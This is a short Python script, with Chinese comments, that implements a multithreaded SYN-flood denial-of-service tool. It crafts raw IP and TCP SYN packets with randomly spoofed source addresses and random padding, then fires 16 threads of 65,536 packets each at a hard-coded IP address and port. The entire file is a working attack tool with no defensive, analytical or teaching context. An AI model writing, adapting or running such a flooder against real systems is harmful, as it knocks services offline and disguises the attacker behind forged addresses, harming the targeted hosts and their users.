from socket import *
import threading
import struct
import random
import sys
import os

# 此代码不会注重任何代码可读性，将全力用于保证代码的执行效率
def create_radnom_ipv4_address():
    return (f'{random.randint(0x00, 0xff)}.{random.randint(0x00, 0xff)}.'
            f'{random.randint(0x00, 0xff)}.{random.randint(0x00, 0xff)}')

def syn_send(target_addr :str, target_port :int, count :int, thread_id :int):
    print(f'thread[{thread_id:02x}], start.')
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    raw_socket.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    while count:
        source_addr = create_radnom_ipv4_address()
        source_port = random.randint(1, 65535)

        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00, 0x0028, 0x0000, 0x4000, 0x40, 0x06, 0x0000,
            inet_aton(source_addr), inet_aton(target_addr))
        tcp_header = struct.pack('!HHLLBBHHH',
            source_port, target_port, 0x00000000, 0x00000000,
            0x50, 0x02, 0x0000, 0x0000, 0x0000)
        packet_data = os.urandom(random.randint(256, 1400))

        protocol_packet = ip_header + tcp_header + packet_data
        raw_socket.sendto(protocol_packet, (target_addr, target_port))

        count -= 1

    raw_socket.close()
    print(f'thread[{thread_id:02x}], stop.')

def thread_run(target_addr :str, target_port :int, count :int = 65536, maxNumberThreads :int = 8):
    th_list = [threading.Thread(target = syn_send, args = (target_addr, target_port, count, tid))
        for tid in range(maxNumberThreads)]
    for th in th_list:
        th.start()
    for th in th_list:
        th.join()

if __name__ == '__main__':
    if sys.platform != 'linux':
        exit(f'请使用Linux系统执行此代码，你当前的系统是：{sys.platform}')

    thread_run('47.243.162.23', 48267, count = 65536, maxNumberThreads = 16)
